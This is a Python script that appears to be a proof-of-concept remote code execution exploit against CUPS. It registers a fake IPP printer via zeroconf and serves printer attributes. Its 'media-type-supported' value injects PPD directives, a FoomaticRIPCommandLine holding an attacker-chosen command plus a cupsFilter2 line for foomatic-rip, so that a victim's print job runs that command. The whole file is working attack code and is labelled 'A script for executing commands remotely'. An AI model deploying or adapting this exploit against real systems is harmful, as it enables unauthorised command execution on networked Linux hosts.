from uuid import uuid4
from threading import Thread
import argparse
import socket
from zeroconf import ServiceInfo, Zeroconf
from ippserver.behaviour import StatelessPrinter
from ippserver.server import IPPServer, IPPRequestHandler
from ippserver.constants import SectionEnum, TagEnum, OperationEnum
from ippserver.parsers import Enum, Boolean, Integer


class Discovery:
    def __init__(self, printer_name, ip_address, port):
        self.printer_name = printer_name
        self.printer_name_slug = Discovery.slugify_name(printer_name)
        self.ip_address = socket.inet_aton(ip_address)
        self.port = port
        self.zeroconf = None

    def slugify_name(name):
        return "".join([c if c.isalnum() else "_" for c in name])

    def create_ipp_printer_service(self):
        # IPP over TCP (standard IPP service)
        service_type = "_ipp._tcp.local."
        service_name = f"{self.printer_name_slug}._ipp._tcp.local."

        # TXT records with IPP and localization attributes
        txt_records = {
            "txtvers": "1",                     # TXT record version
            "qtotal": "1",                      # Number of print queues
            "rp": f"printers/hax",  # Resource path
            "ty": self.printer_name,
            # Supported PDLs (PostScript, PDF)
            "pdl": "application/postscript,application/pdf",
            # Printer admin URL
            "adminurl": f"http://{self.ip_address}:{self.port}",
            "UUID": str(uuid4()),  # Unique identifier
            # IPP printer type (e.g., 0x800683 for color, duplex, etc.)
            "printer-type": "0x800683",
        }

        service_info = ServiceInfo(
            service_type,
            service_name,
            addresses=[self.ip_address],
            port=self.port,
            properties=txt_records,
            server=f"{self.printer_name_slug}.local.",
        )

        return service_info

    def register(self):
        self.zeroconf = Zeroconf()
        self.service_info = self.create_ipp_printer_service()
        self.zeroconf.register_service(self.service_info)

    def close(self):
        if self.zeroconf is None:
            return
        self.zeroconf.unregister_service(self.service_info)
        self.zeroconf.close()

    def __del__(self):
        self.close()


class HaxPrinter(StatelessPrinter):
    def __init__(self, command, name):
        self.cups_filter = '*cupsFilter2: "application/vnd.cups-pdf application/pdf 0 foomatic-rip"'
        self.foomatic_rip = f'*FoomaticRIPCommandLine: {command};#'
        self.name = name
        super(HaxPrinter, self).__init__()

    def minimal_attributes(self):
        return {
            # This list comes from
            # https://tools.ietf.org/html/rfc2911
            # Section 3.1.4.2 Response Operation Attributes
            (
                SectionEnum.operation,
                b'attributes-charset',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.operation,
                b'attributes-natural-language',
                TagEnum.natural_language
            ): [b'en'],
        }

    def printer_list_attributes(self):
        attr = {
            # rfc2911 section 4.4
            (
                SectionEnum.printer,
                b'printer-uri-supported',
                TagEnum.uri
            ): [self.printer_uri],
            (
                SectionEnum.printer,
                b'uri-authentication-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'uri-security-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-info',
                TagEnum.text_without_language
            ): [b'Printer using ipp-printer.py'],
            (
                SectionEnum.printer,
                b'printer-make-and-model',
                TagEnum.text_without_language
            ): [f'{self.name} 0.00'.encode()],
            (
                SectionEnum.printer,
                b'printer-state',
                TagEnum.enum
            ): [Enum(3).bytes()],  # XXX 3 is idle
            (
                SectionEnum.printer,
                b'printer-state-reasons',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'ipp-versions-supported',
                TagEnum.keyword
            ): [b'1.1'],
            (
                SectionEnum.printer,
                b'operations-supported',
                TagEnum.enum
            ): [
                Enum(x).bytes()
                for x in (
                    OperationEnum.print_job,  # (required by cups)
                    OperationEnum.validate_job,  # (required by cups)
                    OperationEnum.cancel_job,  # (required by cups)
                    OperationEnum.get_job_attributes,  # (required by cups)
                    OperationEnum.get_printer_attributes,
                )],
            (
                SectionEnum.printer,
                b'multiple-document-jobs-supported',
                TagEnum.boolean
            ): [Boolean(False).bytes()],
            (
                SectionEnum.printer,
                b'charset-configured',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'charset-supported',
                TagEnum.charset
            ): [b'utf-8'],
            (
                SectionEnum.printer,
                b'natural-language-configured',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'generated-natural-language-supported',
                TagEnum.natural_language
            ): [b'en'],
            (
                SectionEnum.printer,
                b'document-format-default',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'document-format-supported',
                TagEnum.mime_media_type
            ): [b'application/pdf'],
            (
                SectionEnum.printer,
                b'printer-is-accepting-jobs',
                TagEnum.boolean
            ): [Boolean(True).bytes()],
            (
                SectionEnum.printer,
                b'queued-job-count',
                TagEnum.integer
            ): [b'\x00\x00\x00\x00'],
            (
                SectionEnum.printer,
                b'pdl-override-supported',
                TagEnum.keyword
            ): [b'not-attempted'],
            (
                SectionEnum.printer,
                b'printer-up-time',
                TagEnum.integer
            ): [Integer(self.printer_uptime()).bytes()],
            (
                SectionEnum.printer,
                b'compression-supported',
                TagEnum.keyword
            ): [b'none'],
            (
                SectionEnum.printer,
                b'printer-name',
                TagEnum.name_without_language
            ): [self.name.encode()],
            (
                SectionEnum.printer,
                b'media-default',
                TagEnum.keyword
            ): [b'iso_a4_210x297mm'],
            (
                SectionEnum.printer,
                b'media-supported',
                TagEnum.keyword
            ): [b'iso_a4_210x297mm'],
            (
                SectionEnum.printer,
                b'media-type',
                TagEnum.keyword
            ): [b'stationery'],
            (
                SectionEnum.printer,
                b'media-type-supported',
                TagEnum.keyword
            ): [b'stationery', f': HAX\n{self.foomatic_rip}\n{self.cups_filter}\n*%'.encode()],
        }
        return attr

def parse_args():
    parser = argparse.ArgumentParser(description="A script for executing commands remotely")
    
    parser.add_argument("--name", default="RCE Printer", help="The name to use (default: RCE Printer)")
    parser.add_argument("--ip", required=True, help="The IP address of the machine running this script")
    parser.add_argument("--command", default="touch /tmp/pwn", help="The command to execute (default: 'touch /tmp/pwn')")
    parser.add_argument("--port", type=int, default=8631, help="The port to connect on (default: 8631)")
    
    return parser.parse_args()

def main():
    args = parse_args()

    printer = HaxPrinter(args.command, args.name)
    discovery = Discovery(args.name, args.ip, args.port)
    
    # Start a discovery thread
    discovery_thread = Thread(target=discovery.register)
    discovery_thread.start()

    server = IPPServer((args.ip, args.port), IPPRequestHandler, printer)
    try:
        print(f"[+] Starting IPP server on {args.ip}:{args.port}...")
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
        discovery.close()


if __name__ == "__main__":
    main()
